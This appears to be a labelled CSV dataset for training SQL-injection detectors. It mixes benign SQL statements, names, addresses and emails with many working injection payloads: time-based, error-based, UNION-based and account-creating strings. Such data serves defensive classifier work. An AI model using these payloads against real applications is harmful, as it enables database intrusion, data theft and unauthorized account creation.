Sentence,Label
SELECT glad ( s )  FROM curious,0
1'  )   and 8404  =  8651#,1
17403,0
urkiaga,0
"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
15994230f,0
SELECT AVG ( funny ) FROM early SELECT SUM ( monkey ) ,0
SELECT cream,0
1'   )    )    order by 1--,1
-1087  )   where 5787  =  5787 union all select 5787#,1
-7552 or 6872  =  6872,1
1'+  (  select ntym where 4750  =  4750,1
"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",1
SELECT * FROM prize WHERE west = 'source'  OR usually = 'riding',0
08686877f,0
SELECT * FROM lonely,0
"1%""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""%""  =  """,1
SELECT * FROM learn FETCH FIRST 50 PERCENT ROWS ONLY,0
revestimiento,0
SELECT TOP 3 * FROM kept SELECT * FROM stove 3SELECT * FROM blood,0
ayat rozas,0
SELECT being FROM call UNION SELECT himself FROM taken ORDER BY income,0
SELECT TOP 50 PERCENT * FROM position,0
SELECT * FROM hole WHERE blank = 'herself'  OR softly = 'ring',0
sarfati@weat.nc,0
SELECT knowledge ( s )  FROM longer SELECT create ( s ) ,0
SELECT * FROM farm WHERE split NOT BETWEEN 'settlers' AND 'flat',0
SELECT * FROM surface WHERE trap = 'iron',0
SELECT TOP 3 * FROM harder WHERE today = 'poet',0
"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",1
SELECT * FROM claws WHERE mountain = 'steam'  OR pie = 'mistake',0
"-3707""   )    )     )   or 8571  =  8571--",1
1' where 4253  =  4253,1
zapateo,0
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # myqr",1
8935,0
SELECT mix ( s )  FROM solar UNION,0
"1""  )   as obbk where 6414  =  6414 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",1
SELECT standard FROM shoot UNION ALL SELECT flies FROM saved ORDER BY children,0
SELECT * FROM specific  WHERE explore NOT LIKE '[cool]%',0
SELECT * FROM fix  WHERE am NOT LIKE '[vegetable]%',0
houstin@maxitienda.zr,0
"1%'   )    )     )   union all select null,null,null,null#",1
" end and    (    (   ""%""  =  """,1
josu,0
SELECT science ( s )  FROM major FULL OUTER JOIN,0
opsito,0
SELECT * FROM jack WHERE but = 'future' LIMIT 3,0
" SELECT column_name ( s )  FROM describe,came",0
"-5379'  )   union all select 4294,4294,4294--",1
4550620000000000,0
DELETE FROM solution,0
"c/ aulencia, 84",0
"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
SELECT lack,0
"   SELECT composition, slope+ ', ' + where+ ' ' + truth+ ', ' + carbon AS storm  FROM came",0
"calle cosidores, s/n,",0
 UPDATE stared SET canal = 'drove'WHERE pale = 'store',0
tehchi8,0
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1
SELECT * FROM use ORDER BY crew DESC,0
SELECT * FROM addition FETCH FIRST 3 ROWS ONLY,0
SELECT MIN ( among )  AS worker FROM pool,0
1%'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',1
SELECT TOP 3 * FROM tropical SELECT * FROM feel 3SELECT * FROM chair,0
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1
sevilla,0
fuente el saz de jarama,0
1916360000000000,0
SELECT consonant FROM numeral UNION ALL SELECT least FROM particular ORDER BY funny,0
"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"  SELECT * FROM club WHERE cabin IN  ( 'chart', 'thread', 'carried' )  ",0
alfa71ta,0
rigoberta menchu 184 10?d,0
SELECT * FROM recently 3 SELECT * FROM excellent,0
"1' where 9961  =  9961 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr,1
SELECT COUNT ( DISTINCT complete )  FROM fact,0
a9tr8pfag4,0
-6202   )    )    or 7845  =  1962--,1
"1   )    )     )   and elt  (  3132  =  1541,1541  )   and    (    (     (  4258  =  4258",1
59760678p,0
trastabilln,0
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
SELECT here FROM length,0
SELECT * FROM collect WHERE every BETWEEN distant09/01/1996honor AND near15/31/1996element,0
47209,0
1212,0
"-9587 union all select 1568,1568,1568,1568,1568,1568#",1
420136000000000,0
"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",1
1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1   )    )    as oqfr where 6426  =  6426 and make_set  (  8403  =  8403,8899  )  --",1
49126,0
SELECT AVG ( break ) FROM book SELECT SUM ( work ) ,0
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'esal'  =  'esal,1
villamuera de la cueza,0
"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",1
"  SELECT root AS hunt, long AS [birth]  FROM attention",0
SELECT opposite FROM various,0
6225,0
SELECT Count ( * )  AS ourselves,0
c/ grabador david roberts 154 1-h,0
"1   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  5340  =  5340",1
-8086%'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',1
1   )    )     )   and 6358  =  6735,1
SELECT individual ( s )  FROM troops FULL OUTER JOIN,0
SELECT COUNT ( must )  FROM local,0
SELECT * FROM rather WHERE explain = 'known'  OR circus = 'thirty',0
6u33a,0
FROM  ( SELECT DISTINCT storm FROM south ) ,0
1 where 8398  =  8398,1
"1%""   )    )     )   union all select null,null,null,null,null,null,null#",1
"-5520""   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 301 )  ORDER BY meta_id ASC",0
" SELECT column_name ( s )  FROM vowel,softly",0
SELECT MIN ( height )  AS lost FROM fair,0
"   SELECT may,race,gather,square,automobile     (  (  battle JOIN saved ON favorite.six =  glass.colony )   INNER JOIN theyON Orders.milk =  higher.homeID ) ",0
"1%'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1"" where 9792  =  9792 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
77232447b,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 189 )  ORDER BY meta_id ASC",0
select   (  case when   (  3168  =  5577  )   then 3168 else 3168*  (  select 3168 from mysql.db  )   end  )  #,1
SELECT * FROM chain  WHERE alive NOT LIKE '[recent]%',0
enseriarse,0
SELECT * FROM  ( SELECT running FROM possibly ) ,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # lchh",1
"1"" rlike sleep  (  5  )  ",1
"1""  )   as vzdq where 3160  =  3160",1
SELECT smooth ( s ) FROM stone INNER JOIN,0
-7466 where 5161  =  5161 or 3038  =  3038,1
cenheg,0
"-3031"" union all select 2681#",1
"  SELECT * FROM nobody WHERE vertical IN  ( 'neighborhood', 'spent', 'opportunity' )  ",0
"1'  )   as gxpb where 7107  =  7107 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"1' where 2774  =  2774 union all select null,null,null,null,null#",1
SELECT * FROM happened WHERE carefully BETWEEN '1996-07-01' AND '1996-07-31',0
"1""   )    )    as hace where 8785  =  8785",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3781 )  ORDER BY meta_id ASC",0
"  SELECT street AS corner, business AS [beauty]  FROM climb",0
SELECT TOP 50 PERCENT * FROM subject SELECT * FROM people FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM building,0
724,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_3_text' LIMIT 1,0
SELECT shinning ( s )  FROM upward UNION ALL,0
SELECT thread ( s )  FROM whom UNION ALL,0
8449,0
c5fra98,0
SELECT * FROM type  WHERE cow NOT LIKE '[rocky]%',0
"-6546""  )   order by 1#",1
-2733'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx,1
SELECT * FROM shake ORDER BY jar DESC,0
femke,0
SELECT prevent ( s )  FROM saw,0
SELECT independent ( s ) FROM go INNER JOIN,0
-5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
"  SELECT * FROM uncle WHERE bound IN  ( 'end', 'tea', 'feel' )  ",0
"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",1
"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
pagni7@freecreditcheck.bg,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 13506 )  ORDER BY meta_id ASC",0
1'   )    )    rlike   (  select   (  case when   (  3876  =  2077  )   then 1 else 0x28 end   )    )    and    (    (   'hqcz' like 'hqcz,1
"  SELECT TIMESTAMP ( ""2017-07-23"",  ""13:10:11"" ) ;",0
caputo,0
tomono@esteticadayda.az,0
select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  #,1
SELECT * FROM nice WHERE affect = 'decide'  AND City = 'whenever',0
" select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
"c/ alfara de algimia, 184",0
"-4165"" where 1772  =  1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",1
lyston@classroommanager.co,0
SELECT * FROM behavior WHERE oxygen = 'saw' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM hand WHERE fire BETWEEN motor09/01/1996yesterday AND policeman15/31/1996industrial,0
ezri,0
mauer,0
"  SELECT TIME_TO_SEC ( ""03:30:00.999999"" ) ;",0
2el6s,0
atabillar,0
" SELECT o.OrderID, o.OrderDate, c.CustomerName FROM Customers AS c, Orders AS o WHERE c.CustomerName = 'Around the Horn' AND c.CustomerID = o.CustomerID;",0
1  )   as uuro where 6784  =  6784,1
"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",1
SELECT sugar ( s FROM opportunity RIGHT JOIN,0
SELECT * FROM farmer WHERE replace = 'split' FETCH FIRST 3 ROWS ONLY,0
DELETE FROM charge,0
SELECT TOP 3 * FROM serve WHERE instant = 'slow' SELECT * FROM applied,0
96761343k,0
1   )    )     )   or sleep  (  5  )  #,1
SELECT * FROM leader WHERE aid NOT LIKE 'offer%',0
"  SELECT noted,instrument FROM star WHERE visit = 'end' UNION SELECT you, riding FROM hardly",0
"  UPDATE newspaper SET wherever =  'unit', City =  'captured' WHERE went =  slight",0
dueas cristaldo,0
"  SELECT after,instance FROM cheese WHERE wise = 'wall' UNION SELECT consonant, cave FROM plane",0
"1   )    )     )   union all select null,null,null,null--",1
dreyfuss6,0
angold@callofduty6.nu,0
"1%"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""%""  =  """,1
-9327'  )   or 3038  =  3038,1
"-6731"" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166--",1
"INSERT INTO chair ( answer, action, pictured, disease, end, screen )  VALUES  ( 'scene', 'idea'. likely', 'made', 'donkey', 'land', 'atomic' )  ",0
"INSERT INTO younger ( improve, darkness, being, anywhere, rather, lie )  VALUES  ( 'can', 'percent'. cattle', 'necessary', 'position', 'escape', 'check' )  ",0
SELECT * FROM shelf WHERE sometime  BETWEEN 10 AND 20,0
-5020%'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',1
3702,0
1   )    )    as wajy where 8593  =  8593,1
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ) ,0
SELECT equally FROM reader UNION SELECT gasoline FROM bread ORDER BY boat,0
"1  )   as biup where 1414  =  1414 union all select null,null,null,null,null,null,null,null#",1
"1  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1 waitfor delay '0:0:5'--,1
"1'+  (  select 'ngdk' where 7264  =  7264 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",1
19197,0
1'   )    )     )   and   (  5995  =  9618  )  *9618 and    (    (     (  'nagr' like 'nagr,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'opyt'  =  'opyt",1
-9393' where 3119  =  3119 or 8571  =  8571--,1
jimnez algora,0
"1%""   )    )    order by 1#",1
"1  )   where 2678  =  2678 union all select null,null,null,null,null,null,null,null,null#",1
"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",1
dicaprio,0
FROM  ( SELECT DISTINCT area FROM take ) ,0
SELECT AVG ( Price ) FROM row,0
SELECT * FROM silent WHERE cover IN  ( SELECT bet FROM bet ) ,0
43061609c,0
SELECT MIN ( property )  AS attempt FROM explore,0
-4901  )   or 3407  =  6442#,1
"-4699  )   as mymz where 3405  =  3405 or elt  (  1032  =  1032,3623  )  --",1
SELECT * FROM rubber FETCH FIRST 50 PERCENT ROWS ONLY,0
clech@ofertachina.lb,0
42462633x,0
"1'+  (  select 'qrml' where 3791  =  3791 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",1
SELECT * FROM far WHERE mass = 'birds',0
filis,0
SELECT * FROM article WHERE lunch = 'upper',0
"-2298%' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT * FROM essential,0
1'   )    )     ) ,1
SELECT Count ( * )  AS whether,0
"   SELECT evening,disappear,planet,pony,plain     (  (  ability JOIN teeth ON beauty.stopped =  high.duty )   INNER JOIN volumeON Orders.bite =  meant.watchID ) ",0
"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",1
-3096' or 3821  =  5539 and 'zrth'  =  'zrth,1
"  UPDATE chart SET pleasant =  'diameter', City =  'post' WHERE get =  diagram",0
SELECT * FROM wife WHERE slight = 'operation' LIMIT 3,0
DELETE FROM explain WHERE development = 'is',0
villaseca de henares,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""ejmj"" like ""ejmj",1
   (  select top 1,1
cedric,0
SELECT * FROM canal WHERE world = 'vast' LIMIT 3,0
"1"" where 7371  =  7371 waitfor delay '0:0:5'--",1
"  SELECT IF ( 500<1000, 5, 10 ) ;",0
ninon,0
SELECT AVG ( hunter )  FROM bee  SELECT SUM ( general ) ,0
"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  4003  =  4003",1
1064,0
terrill,0
"-4543""  )   or 3038  =  3038",1
"select * from generate_series  (  1488,1488,case when   (  1488  =  1685  )   then 1 else 0 end  )   limit 1--",1
cossovel-heintel@camiones-hibridos.ec,0
"1""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""uwdz""  =  ""uwdz",1
livino,0
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1
"1%'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   '%'  =  '",1
hallaran@manjarr.cd,0
"INSERT INTO population ( missing, therefore, particularly, other, herself, yes )  VALUES  ( 'product', 'shop'. time', 'active', 'active', 'open', 'before' )  ",0
1'+  (  select 'tjvt' where 2463  =  2463,1
"INSERT INTO stronger  ( coming, still, correctly )  VALUES  ( 'jack', 'worse', 'egg' )  ",0
SELECT TOP 3 * FROM business SELECT * FROM surface 3SELECT * FROM principal,0
SELECT * FROM fact WHERE spring LIKE '%tower%',0
alfajarn,0
SELECT leaf ( s ) FROM medicine INNER JOIN,0
"1'  )   where 7322  =  7322 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
mamantona,0
" SELECT * FROM carry ORDER BY long ASC, mathematics DESC",0
c8nde9a,0
"1   )    )    union all select null,null,null--",1
SELECT COUNT ( pick ) FROM guard,0
13021468h,0
7964,0
SELECT Count ( * )  AS silk,0
tchjan-lian.quadflieg@comerciosdeaspe.se,0
"1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  --",1
"1' in boolean mode  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  #",1
1'||  (  select 'adoe' from dual where 7662  =  7662,1
maisa,0
"guardia, la",0
SELECT * FROM sport 3 SELECT * FROM southern,0
"1'||  (  select 'dujx' where 6896  =  6896 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM enjoy WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM jet WHERE country BETWEEN '1996-07-01' AND '1996-07-31',0
"1'||  (  select 'bmyt' from dual where 9407  =  9407 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
SELECT * FROM matter WHERE identity BETWEEN '1996-07-01' AND '1996-07-31',0
"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
letha,0
SELECT AVG ( cool ) FROM sick,0
"1""   )    )    as duny where 3756  =  3756 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
5580,0
SELECT * FROM column WHERE captain NOT BETWEEN 'dear' AND 'variety',0
SELECT whispered ( s )  FROM idea SELECT evening FROM beginning,0
mota del cuervo,0
SELECT * FROM place,0
SELECT AVG ( Price ) FROM dark,0
 UPDATE lift SET try = 'thin'WHERE occur = 'season',0
"-5064  )   as mzxc where 1889  =  1889 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
select   (  case when   (  4769  =  4769  )   then 4769 else 4769*  (  select 4769 from mysql.db  )   end  )  #,1
SELECT * FROM closely,0
25559456q,0
SELECT COUNT ( slipped ) FROM strike,0
-- &password  = ,1
 UPDATE toy SET breath = 'consider'WHERE color = 'handsome',0
SELECT * FROM quite WHERE few = 'tobacco' LIMIT 3,0
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""qkds"" like ""qkds",1
7aria22,0
"1 where 2292  =  2292 union all select null,null,null,null#",1
SELECT drove,0
 UPDATE instant SET slowly = 'sometime'WHERE positive = 'care',0
"  SELECT verb,blind,loss FROM hit LEFT JOIN Orders ON shore.careID =  string.water ORDER BY first.strike",0
canosa,0
"org/?option  =  com_k2  <a href  =  ""http://corfopym",0
SELECT COUNT ( wantID ) FROM yesterday,0
1%' or sleep  (  5  )  #,1
"1' where 8451  =  8451 union all select null,null,null,null,null,null,null,null,null#",1
select   (  case when   (  2768  =  8868  )   then 2768 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"1"" where 7005  =  7005",1
"-4381 or make_set  (  6118  =  3095,3095  )  # lkcr",1
"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030",1
SELECT potatoes ( s )  FROM search LEFT JOIN,0
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'xuwl' like 'xuwl",1
registrar,0
 (  select   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  select 4108 from information_schema.character_sets  )   end   )    ) ,1
"SELECT * FROM mouth WHERE teach BETWEEN ""wish"" AND    ""pick""",0
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  4703  =  4703,1
SELECT * FROM handle,0
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1
SELECT * FROM tropical WHERE percent = 'reader',0
5494260000000000,0
SELECT TOP 3 * FROM music WHERE lovely = 'musical',0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""lsvg"" like ""lsvg",1
SELECT count ( s )  FROM center LEFT JOIN,0
"-3321"" where 1603  =  1603 union all select 1603,1603,1603,1603#",1
"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",1
SELECT * FROM whether WHERE    NOT shout = 'instant',0
ex8ed2ci3,0
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'uwbt' like 'uwbt,1
"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1' where 4945  =  4945,1
"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",1
"1""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""ladc"" like ""ladc",1
"SELECT * FROM visitor WHERE mistake BETWEEN ""apart"" AND    ""unknown""",0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
945394000000000,0
1' and sleep  (  5  )   and 'kapr'  =  'kapr,1
1 where 9620  =  9620 waitfor delay '0:0:5'--,1
SELECT * FROM enter WHERE shorter LIKE '%my%',0
SELECT * FROM like FETCH FIRST 50 PERCENT ROWS ONLY,0
"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",1
477dj6r,0
arme!lluela,0
